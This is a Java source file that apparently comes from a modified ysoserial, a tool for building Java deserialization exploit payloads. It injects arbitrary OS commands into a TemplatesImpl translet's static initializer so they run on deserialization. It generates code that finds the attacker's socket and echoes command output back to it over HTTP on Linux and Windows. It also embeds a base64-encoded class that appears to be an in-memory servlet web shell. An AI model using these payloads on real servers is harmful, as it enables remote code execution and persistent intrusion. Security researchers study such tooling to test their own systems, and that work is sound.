package ysoserial.payloads.util;


import static com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.DESERIALIZE_TRANSLET;

import java.io.File;
import java.io.FileInputStream;
import java.io.InputStream;
import java.io.Serializable;
import java.lang.reflect.Array;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.lang.reflect.Proxy;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

import com.nqzero.permit.Permit;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
import org.apache.commons.io.FileUtils;


/*
 * utility generator functions for common jdk-only gadgets
 */
@SuppressWarnings ( {
    "restriction", "rawtypes", "unchecked"
} )
public class Gadgets {

    static {
        // special case for using TemplatesImpl gadgets with a SecurityManager enabled
        System.setProperty(DESERIALIZE_TRANSLET, "true");

        // for RMI remote loading
        System.setProperty("java.rmi.server.useCodebaseOnly", "false");
    }

    public static final String ANN_INV_HANDLER_CLASS = "sun.reflect.annotation.AnnotationInvocationHandler";

    public static class StubTransletPayload extends AbstractTranslet implements Serializable {

        private static final long serialVersionUID = -5971610431559700674L;


        public void transform ( DOM document, SerializationHandler[] handlers ) throws TransletException {}


        @Override
        public void transform ( DOM document, DTMAxisIterator iterator, SerializationHandler handler ) throws TransletException {}
    }

    // required to make TemplatesImpl happy
    public static class Foo implements Serializable {

        private static final long serialVersionUID = 8207363842866235160L;
    }


    public static <T> T createMemoitizedProxy ( final Map<String, Object> map, final Class<T> iface, final Class<?>... ifaces ) throws Exception {
        return createProxy(createMemoizedInvocationHandler(map), iface, ifaces);
    }


    public static InvocationHandler createMemoizedInvocationHandler ( final Map<String, Object> map ) throws Exception {
        return (InvocationHandler) Reflections.getFirstCtor(ANN_INV_HANDLER_CLASS).newInstance(Override.class, map);
    }


    public static <T> T createProxy ( final InvocationHandler ih, final Class<T> iface, final Class<?>... ifaces ) {
        final Class<?>[] allIfaces = (Class<?>[]) Array.newInstance(Class.class, ifaces.length + 1);
        allIfaces[ 0 ] = iface;
        if ( ifaces.length > 0 ) {
            System.arraycopy(ifaces, 0, allIfaces, 1, ifaces.length);
        }
        return iface.cast(Proxy.newProxyInstance(Gadgets.class.getClassLoader(), allIfaces, ih));
    }


    public static Map<String, Object> createMap ( final String key, final Object val ) {
        final Map<String, Object> map = new HashMap<String, Object>();
        map.put(key, val);
        return map;
    }

    public static String process(String command){
        if(command == null || command.trim().equals("")){
            return "";
        }

        // directive:sleep:seconds
        // directive:sleep:linuxEcho:whoami
        // directive:sleep:windowsEcho:whoami

        command = command.trim();
        if(command.startsWith("directive:sleep")){
            long time = Long.parseLong(command.split(":", 3)[2]);
            return sleep(time);
        }else if(command.startsWith("directive:linuxEcho")){
            return linuxEcho(command);
        }else if(command.startsWith("directive:windowsEcho")){
            return windowsEcho(command);
        }else{
            return "java.lang.Runtime.getRuntime().exec(\"" +
                command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
                "\");";
        }
    }

    public static String sleep(long seconds){
        long time = seconds * 1000;
        String code = "java.lang.Thread.sleep((long)" + time + ");";
        return code;
    }

    public static String linuxEcho(String command){
        String cmd = command.split(":", 3)[2];
        cmd = cmd.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"");

        String code = "   if(java.io.File.separator.equals(\"/\")){\n" +
            "        String command  = \"ls -al /proc/$PPID/fd|grep socket:|awk 'BEGIN{FS=\\\"[\\\"}''{print $2}'|sed 's/.$//'\";\n" +
            "        String[] cmd = new String[]{\"/bin/sh\", \"-c\", command};\n" +
            "        java.io.BufferedReader br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));\n" +
            "        java.util.List res1 = new java.util.ArrayList();\n" +
            "        String line = \"\";\n" +
            "        while ((line = br.readLine()) != null && !line.trim().isEmpty()){\n" +
            "            res1.add(line);\n" +
            "        }\n" +
            "        br.close();\n" +
            "\n" +
            "        try {\n" +
            "            Thread.sleep((long)2000);\n" +
            "        } catch (InterruptedException e) {\n" +
            "            //pass\n" +
            "        }\n" +
            "\n" +
            "        command  = \"ls -al /proc/$PPID/fd|grep socket:|awk '{print $9, $11}'\";\n" +
            "        cmd = new String[]{\"/bin/sh\", \"-c\", command};\n" +
            "        br = new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec(cmd).getInputStream()));\n" +
            "        java.util.List res2 = new java.util.ArrayList();\n" +
            "        while ((line = br.readLine()) != null && !line.trim().isEmpty()){\n" +
            "            res2.add(line);\n" +
            "        }\n" +
            "        br.close();\n" +
            "\n" +
            "        int index = 0;\n" +
            "        int max = 0;\n" +
            "        for(int i = 0; i < res2.size(); i++){\n" +
            "            try{\n" +
            "                String socketNo = ((String)res2.get(i)).split(\"\\\\s+\")[1].substring(8);\n" +
            "                socketNo = socketNo.substring(0, socketNo.length() - 1);\n" +
            "                for(int j = 0; j < res1.size(); j++){\n" +
            "                    if(!socketNo.equals(res1.get(j))) continue;\n" +
            "\n" +
            "                    if(Integer.parseInt(socketNo) > max) {\n" +
            "                        max = Integer.parseInt(socketNo);\n" +
            "                        index = j;\n" +
            "                    }\n" +
            "                    break;\n" +
            "                }\n" +
            "            }catch(Exception e){\n" +
            "                //pass\n" +
            "            }\n" +
            "        }\n" +
            "\n" +
            "        int fd = Integer.parseInt(((String)res2.get(index)).split(\"\\\\s\")[0]);\n" +
            "        java.lang.reflect.Constructor c= java.io.FileDescriptor.class.getDeclaredConstructor(new Class[]{Integer.TYPE});\n" +
            "        c.setAccessible(true);\n" +
            "        cmd = new String[]{\"/bin/sh\", \"-c\", \"" + cmd + "\"};\n" +
            "        String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next();\n" +
            "        String result = \"HTTP/1.1 200 OK\\nConnection: close\\nContent-Length: \" + res.length() + \"\\n\\n\" + res + \"\\n\";\n" +
            "        java.io.FileOutputStream os = new java.io.FileOutputStream((java.io.FileDescriptor)c.newInstance(new Object[]{new Integer(fd)}));\n" +
            "        os.write(result.getBytes());\n" +
            "    }";

        return code;
    }

    public static String windowsEcho(String command){
        String cmd = command.split(":", 3)[2];
        cmd = cmd.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"");

        String code = "   if(java.io.File.separator.equals(\"\\\\\")){\n" +
            "        java.lang.reflect.Field field = java.io.FileDescriptor.class.getDeclaredField(\"fd\");\n" +
            "        field.setAccessible(true);\n" +
            "\n" +
            "        Class clazz1 = Class.forName(\"sun.nio.ch.Net\");\n" +
            "        java.lang.reflect.Method method1 = clazz1.getDeclaredMethod(\"remoteAddress\",new Class[]{java.io.FileDescriptor.class});\n" +
            "        method1.setAccessible(true);\n" +
            "\n" +
            "        Class clazz2 = Class.forName(\"java.net.SocketOutputStream\", false, null);\n" +
            "        java.lang.reflect.Constructor constructor2 = clazz2.getDeclaredConstructors()[0];\n" +
            "        constructor2.setAccessible(true);\n" +
            "\n" +
            "        Class clazz3 = Class.forName(\"java.net.PlainSocketImpl\");\n" +
            "        java.lang.reflect.Constructor constructor3 = clazz3.getDeclaredConstructor(new Class[]{java.io.FileDescriptor.class});\n" +
            "        constructor3.setAccessible(true);\n" +
            "\n" +
            "        java.lang.reflect.Method write = clazz2.getDeclaredMethod(\"write\",new Class[]{byte[].class});\n" +
            "        write.setAccessible(true);\n" +
            "\n" +
            "        java.net.InetSocketAddress remoteAddress = null;\n" +
            "        java.util.List list = new java.util.ArrayList();\n" +
            "        java.io.FileDescriptor fileDescriptor = new java.io.FileDescriptor();\n" +
            "        for(int i = 0; i < 50000; i++){\n" +
            "            field.set((Object)fileDescriptor, (Object)(new Integer(i)));\n" +
            "            try{\n" +
            "                remoteAddress= (java.net.InetSocketAddress) method1.invoke(null, new Object[]{fileDescriptor});\n" +
            "                if(remoteAddress.toString().startsWith(\"/127.0.0.1\")) continue;\n" +
            "                if(remoteAddress.toString().startsWith(\"/0:0:0:0:0:0:0:1\")) continue;\n" +
            "                list.add(new Integer(i));\n" +
            "\n" +
            "            }catch(Exception e){}\n" +
            "        }\n" +
            "\n" +
            "        for(int i = list.size() - 1; i >= 0; i--){\n" +
            "            try{\n" +
            "                field.set((Object)fileDescriptor, list.get(i));\n" +
            "                Object socketOutputStream = constructor2.newInstance(new Object[]{constructor3.newInstance(new Object[]{fileDescriptor})});\n" +
            "                String[] cmd = new String[]{\"cmd\",\"/C\", \"" + cmd + "\"};\n" +
            "                String res = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\"\\\\A\").next().trim();\n" +
            "                String result = \"HTTP/1.1 200 OK\\nConnection: close\\nContent-Length: \" + (res.length()) + \"\\n\\n\" + res + \"\\n\\n\";\n" +
            "                write.invoke(socketOutputStream, new Object[]{result.getBytes()});\n" +
            "                break;\n" +
            "            }catch (Exception e){\n" +
            "                //pass\n" +
            "            }\n" +
            "        }\n" +
            "    }";
        return code;
    }



    public static Object createTemplatesImpl (final String command ) throws Exception {
        if(command.startsWith("directive:autoReflected")){
            // directive:autoReflected
            return createTemplatesImpl();
        }else{
            if ( Boolean.parseBoolean(System.getProperty("properXalan", "false")) ) {
                return createTemplatesImpl(
                    process(command),
                    Class.forName("org.apache.xalan.xsltc.trax.TemplatesImpl"),
                    Class.forName("org.apache.xalan.xsltc.runtime.AbstractTranslet"),
                    Class.forName("org.apache.xalan.xsltc.trax.TransformerFactoryImpl"));
            }

            return createTemplatesImpl(process(command), TemplatesImpl.class, AbstractTranslet.class, TransformerFactoryImpl.class);
        }
    }


    public static <T> T createTemplatesImpl ( final String command, Class<T> tplClass, Class<?> abstTranslet, Class<?> transFactory )
            throws Exception {
        final T templates = tplClass.newInstance();

        // use template gadget class
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(StubTransletPayload.class));
        pool.insertClassPath(new ClassClassPath(abstTranslet));
        final CtClass clazz = pool.get(StubTransletPayload.class.getName());
        // run command in static initializer
        // TODO: could also do fun things like injecting a pure-java rev/bind-shell to bypass naive protections
        String cmd = "java.lang.Runtime.getRuntime().exec(\"" +
            command.replaceAll("\\\\","\\\\\\\\").replaceAll("\"", "\\\"") +
            "\");";
        clazz.makeClassInitializer().insertAfter(cmd);
        // sortarandom name to allow repeated exploitation (watch out for PermGen exhaustion)
        clazz.setName("ysoserial.Pwner" + System.nanoTime());
        CtClass superC = pool.get(abstTranslet.getName());
        clazz.setSuperclass(superC);

        final byte[] classBytes = clazz.toBytecode();

        // inject class bytes into instance
        Reflections.setFieldValue(templates, "_bytecodes", new byte[][] {
            classBytes, ClassFiles.classAsBytes(Foo.class)
        });

        // required to make TemplatesImpl happy
        Reflections.setFieldValue(templates, "_name", "Pwnr");
        Reflections.setFieldValue(templates, "_tfactory", transFactory.newInstance());
        return templates;
    }

    private static Object createTemplatesImpl() throws Exception {
//        File file = new File("target/test-classes/ra.class");
//        byte[] code = Base64.getEncoder().encode(FileUtils.readFileToByteArray(file));
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQA4goANwB6CQA2AHsJADYAfAcAfQoABAB6CQA2AH4JADYAfwgAgAoAgQCCCQA2AIMIAIQJADYAhQcAhgoADQCHCgCIAIkKADYAigoABACLCgAEAIwKADYAjQoAGgCOCgAXAI8IAJAHAJEHAJIKABcAkwcAlAgAlQoAlgCXCABBCACYCQA2AJkIAGMHAJoKACEAhwcAmwgAnAcAnQoAngCfCgCeAKAKAKEAogoAJQCjCACkCgAlAKUKACUApgsAIwCnCgAXAKgKAKkAqgoAqQCrCgAXAKwKADYArQcArgoAFwCvCgCIALAHALEHALIBAAFoAQATTGphdmEvdXRpbC9IYXNoU2V0OwEACVNpZ25hdHVyZQEAJ0xqYXZhL3V0aWwvSGFzaFNldDxMamF2YS9sYW5nL09iamVjdDs+OwEAAmNsAQAXTGphdmEvbGFuZy9DbGFzc0xvYWRlcjsBAANoc3IBABFMamF2YS9sYW5nL0NsYXNzOwEAA2hzcAEAA2NtZAEAE1tMamF2YS9sYW5nL1N0cmluZzsBAAFyAQASTGphdmEvbGFuZy9PYmplY3Q7AQABcAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBABJMb2NhbFZhcmlhYmxlVGFibGUBAAFlAQAiTGphdmEvbGFuZy9DbGFzc05vdEZvdW5kRXhjZXB0aW9uOwEABHRoaXMBAARMcmE7AQANU3RhY2tNYXBUYWJsZQcAsQcAhgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGRvY3VtZW50AQAtTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ET007AQAIaGFuZGxlcnMBAEJbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAApFeGNlcHRpb25zBwCzAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEACGl0ZXJhdG9yAQA1TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvZHRtL0RUTUF4aXNJdGVyYXRvcjsBAAdoYW5kbGVyAQBBTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjsBAAFpAQAVKExqYXZhL2xhbmcvT2JqZWN0OylaAQADb2JqAQAWKExqYXZhL2xhbmcvT2JqZWN0O0kpVgEAC2dldFJlc3BvbnNlAQAaTGphdmEvbGFuZy9yZWZsZWN0L01ldGhvZDsBABVMamF2YS9sYW5nL0V4Y2VwdGlvbjsBAAdjb21tYW5kAQASTGphdmEvbGFuZy9TdHJpbmc7AQABbwEABWRlcHRoAQABSQcAkgcAmgEAAUYBAAFxAQANZGVjbGFyZWRGaWVsZAEAGUxqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBAAVzdGFydAEAAW4HAJEHALQHALUHAJQBAAg8Y2xpbml0PgEAClNvdXJjZUZpbGUBAAdyYS5qYXZhDABGAEcMAEMARAwARQBEAQARamF2YS91dGlsL0hhc2hTZXQMADgAOQwAPAA9AQAlamF2YXguc2VydmxldC5odHRwLkh0dHBTZXJ2bGV0UmVxdWVzdAcAtgwAtwC4DAA+AD8BACZqYXZheC5zZXJ2bGV0Lmh0dHAuSHR0cFNlcnZsZXRSZXNwb25zZQwAQAA/AQAgamF2YS9sYW5nL0NsYXNzTm90Rm91bmRFeGNlcHRpb24MALkARwcAugwAuwC8DABtAGIMAL0AYAwAvgBgDABfAGAMAL8AwAwAwQDCAQAJZ2V0SGVhZGVyAQAPamF2YS9sYW5nL0NsYXNzAQAQamF2YS9sYW5nL1N0cmluZwwAwwDEAQAQamF2YS9sYW5nL09iamVjdAEABWlucHV0BwDFDADGAMcBAAIvYwwAQQBCAQATamF2YS9sYW5nL0V4Y2VwdGlvbgEAJmphdmF4L3NlcnZsZXQvaHR0cC9IdHRwU2VydmxldFJlc3BvbnNlAQAGb3V0cHV0AQARamF2YS91dGlsL1NjYW5uZXIHAMgMAMkAygwAywDMBwDNDADOAM8MAEYA0AEAAlxBDADRANIMANMA1AwA1QDWDADXANgHALUMANkA2gwA2wDcDADdAN4MAEUAYgEAE1tMamF2YS9sYW5nL09iamVjdDsMAN8AwAwA4ADhAQACcmEBAEBjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvcnVudGltZS9BYnN0cmFjdFRyYW5zbGV0AQA5Y29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL1RyYW5zbGV0RXhjZXB0aW9uAQAaW0xqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZDsBABdqYXZhL2xhbmcvcmVmbGVjdC9GaWVsZAEAFWphdmEvbGFuZy9DbGFzc0xvYWRlcgEACWxvYWRDbGFzcwEAJShMamF2YS9sYW5nL1N0cmluZzspTGphdmEvbGFuZy9DbGFzczsBAA9wcmludFN0YWNrVHJhY2UBABBqYXZhL2xhbmcvVGhyZWFkAQANY3VycmVudFRocmVhZAEAFCgpTGphdmEvbGFuZy9UaHJlYWQ7AQAIY29udGFpbnMBAANhZGQBAAhnZXRDbGFzcwEAEygpTGphdmEvbGFuZy9DbGFzczsBABBpc0Fzc2lnbmFibGVGcm9tAQAUKExqYXZhL2xhbmcvQ2xhc3M7KVoBAAlnZXRNZXRob2QBAEAoTGphdmEvbGFuZy9TdHJpbmc7W0xqYXZhL2xhbmcvQ2xhc3M7KUxqYXZhL2xhbmcvcmVmbGVjdC9NZXRob2Q7AQAYamF2YS9sYW5nL3JlZmxlY3QvTWV0aG9kAQAGaW52b2tlAQA5KExqYXZhL2xhbmcvT2JqZWN0O1tMamF2YS9sYW5nL09iamVjdDspTGphdmEvbGFuZy9PYmplY3Q7AQARamF2YS9sYW5nL1J1bnRpbWUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7AQAEZXhlYwEAKChbTGphdmEvbGFuZy9TdHJpbmc7KUxqYXZhL2xhbmcvUHJvY2Vz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");
        TemplatesImpl obj = new TemplatesImpl();
        Reflections.setFieldValue(obj, "_bytecodes", new byte[][]{code});
        Reflections.setFieldValue(obj, "_name", "anything");
        Reflections.setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());
        return obj;
    }


    public static HashMap makeMap ( Object v1, Object v2 ) throws Exception, ClassNotFoundException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException {
        HashMap s = new HashMap();
        Reflections.setFieldValue(s, "size", 2);
        Class nodeC;
        try {
            nodeC = Class.forName("java.util.HashMap$Node");
        }
        catch ( ClassNotFoundException e ) {
            nodeC = Class.forName("java.util.HashMap$Entry");
        }
        Constructor nodeCons = nodeC.getDeclaredConstructor(int.class, Object.class, Object.class, nodeC);
        Reflections.setAccessible(nodeCons);

        Object tbl = Array.newInstance(nodeC, 2);
        Array.set(tbl, 0, nodeCons.newInstance(0, v1, v1, null));
        Array.set(tbl, 1, nodeCons.newInstance(0, v2, v2, null));
        Reflections.setFieldValue(s, "table", tbl);
        return s;
    }
}
